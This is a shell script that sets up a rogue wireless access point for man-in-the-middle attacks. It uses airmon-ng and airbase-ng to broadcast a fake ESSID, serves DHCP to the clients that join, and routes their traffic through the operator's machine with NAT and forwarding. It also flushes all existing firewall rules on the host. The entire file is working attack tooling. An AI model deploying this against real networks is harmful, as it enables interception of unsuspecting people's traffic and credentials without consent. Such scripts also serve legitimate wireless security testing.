#!/bin/sh

#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#
# Script to set up a fake access point for wireless MitM attacks.
# This also configures and starts the dhcp server, and sets up
# NAT and forwarding
#
# v1.0 - 17/12/2012
#
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

################# Cosmetic stuff ############################## 
# Text color variables
txtunder=$(tput sgr  1)                     # Underline
txtbold=$(tput bold)                        # Bold
boldred=${txtbold}$(tput setaf 1)           # Red
boldgreen=${txtbold}$(tput setaf 2)         # Green
boldblue=${txtbold}$(tput setaf 4)          # Blue
boldwhite=${txtbld}$(tput setaf 7)          # White
txtreset=$(tput sgr 0)                      # Reset

function print_info {
   echo -e ${boldblue}[*] $1 ${txtreset}
}  

function print_ok {
   echo -e ${boldgreen}[+] $1 ${txtreset}
}

function print_error {
   echo -e ${boldred}[-] $1 ${txtreset}
}

function print_normal {
   echo -e ${boldwhite}[.] $1 ${txtreset}
}

#################################################################
function clean_up {
   print_info "Trapped CTRL-C. House cleaning! "

   print_info "Stop airbase"
   kill -9 `pidof airbase-ng`

   print_info "Stop monitoring interface $MON_ITF" 
   airmon-ng stop $MON_ITF
   
   print_info "Stop dhcpd server"
   kill -9 `pidof dhcpd3` 

   exit
}
trap clean_up SIGHUP SIGINT SIGTERM

# Check is dhcp3-server package is installed
PACKAGE=dhcp3-server
PKG_OK=$(dpkg-query -W --showformat='${Status}\n' $PACKAGE |grep "install ok")
print_info "Checking for $PACKAGE ..."

if [ "" == "$PKG_OK" ]; then
  print_error "No $PACKAGE. Installing.."
  sudo apt-get install $PACKAGE
else
   print_ok "$PACKAGE installed"
fi

print_info "Configuring DHCP server ..."
cat > fake_ap_dhcpd.conf << EOF
option domain-name-servers 10.0.0.1;
default-lease-time 60;
max-lease-time 72;
ddns-update-style none;
authoritative;
log-facility local7;

# Create a 10.0.0.0/24 subnet
subnet 10.0.0.0 netmask 255.255.255.0 {
  range 10.0.0.100 10.0.0.254;
  option routers 10.0.0.1;
  option domain-name-servers 4.2.2.2;
  option domain-name-servers 128.8.5.2;
}
EOF

WIRELESS_ITFS=$(iwconfig 2>&1 | grep "^w" |cut -f 1 -d " ")
print_info "Check for present wireless interfaces:"
echo $WIRELESS_ITFS
print_normal "Chose one wireless interface to start monitoring:"
read w_itf

MON_ITF=$(airmon-ng start $w_itf | grep "monitor mode enabled" | cut -d " " -f 5 | cut -f 1 -d ")")
if [ "" == "$MON_ITF" ]; then
   print_error "airbase-ng start monitoring error. Exiting"
   exit
else
   print_ok "Monitoring started on $MON_ITF"
fi

print_normal "Chose an ESSID for the fake AP:"
read essid
print_normal "Starting airbase with ESSID $essid"
airbase-ng -c 6 --essid $essid $MON_ITF 2>&1 > airbase.log &
# Spawn a new xterm with airbase log
xterm -bg black -fg yellow -T Airbase-NG -e tail -f airbase.log &

TUN_ITF=at0
print_normal "Wait for $TUN_ITF to be created..."
sleep 2 # seconds

print_info "Configure tunneling interface $TUN_ITF"
ifconfig at0 up
# TODO: MTU possible problems to debug. Change this setting if necessary..
ifconfig at0 mtu 1400
ifconfig at0 10.0.0.1 netmask 255.255.255.0

print_info "Create a default route"
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

print_info "Configure IPtables: "
print_normal "Flush existent rules"
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

ALL_ITF=$(ifconfig | grep -E "^[a-z]" | cut -f 1 -d " ")
print_info "Interfaces present: "
echo $ALL_ITF

print_normal "Select a network with access to the Internet:"
read NET_ITF
print_ok "Set up NAT and forwarding through $NET_ITF"
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o $NET_ITF -j MASQUERADE

print_normal "Enable IP packet forwarding"
echo "1" > /proc/sys/net/ipv4/ip_forward

print_normal "Clear existent dhcp leases"
echo > '/var/lib/dhcp3/dhcpd.leases'

print_normal "Restart dhcpd" 
# Fix dhcpd.pid startup error
ln -s /var/run/dhcp3-server/dhcpd.pid /var/run/dhcpd.pid
# Terminate existing dhcpd (if necessary)
DHCPD_PID=$(pidof dhcpd3)
if [ "" == "$DHCPD_PID" ]; then
   print_normal "dhcpd not running. Start it"
else
   print_normal "dhcpd daemon already started, with pid $DHCPD_PID. Terminate it"
   kill -9 $DHCPD_PID
fi 

# Restart
dhcpd3 -d -f -cf fake_ap_dhcpd.conf at0 2>&1 > dhcpd3.log &

# Spawn a new xterm with dhcp3 log
xterm -bg black -fg green -T DHCPD3 -e tail -f dhcpd3.log  &

# Spawn a new xterm with /va/log/messages logs
xterm -bg black -fg red -T "/var/log/messagesw" -e tail -f /var/log/messages &

# Wait forever
while true; do 
   sleep 1000
done
